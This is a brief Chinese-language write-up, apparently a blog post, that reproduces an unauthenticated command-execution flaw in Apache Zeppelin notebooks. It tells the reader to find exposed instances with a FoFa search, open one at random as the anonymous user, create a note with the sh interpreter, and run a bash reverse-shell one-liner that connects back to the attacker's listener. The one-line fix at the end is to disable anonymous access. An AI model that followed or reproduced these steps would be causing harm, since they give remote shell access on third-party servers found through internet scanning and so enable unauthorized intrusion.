# 一：简介

Apache Zeppelin是一个让交互式数据分析变得可行的基于网页的notebook。Zeppelin提供了数据可视化的框架。

Zeppelin 是一个提供交互数据分析且基于Web的笔记本。方便你做出可数据驱动的、可交互且可协作的精美文档，并且支持多种语言，包括 Scala(使用
Apache Spark)、Python(Apache Spark)、SparkSQL、 Hive、 Markdown、Shell等等。

# 二：漏洞复现

步骤一：使用FoFa搜索一下语句，并随便打开一个页面...

    
    
    title="Zeppelin"

![](https://image.3001.net/images/20211129/1638181137_61a4a911334d59c76a607.png!small)![](https://image.3001.net/images/20211129/1638181146_61a4a91a70b841b1cf8ec.png!small)

二：进入到页面后需要有登录的用户即`anonymouse`，点击`Create new note`\-->在`Default
Interpreter`中选择`sh`接口![](https://image.3001.net/images/20211129/1638181739_61a4ab6bd93bcf6163bd8.png!small)

步骤三：登录云主机进行端口监听，并复制以下内容进行shell反弹...

    
    
    bash -i &>/dev/tcp/ip/port <&1

![](https://image.3001.net/images/20211129/1638181842_61a4abd25ec3b66cac08a.png!small)![](https://image.3001.net/images/20211129/1638181860_61a4abe4f3ca5d7bcade6.png!small)

# 三：修补方式

  * 禁止未授权匿名帐户访问

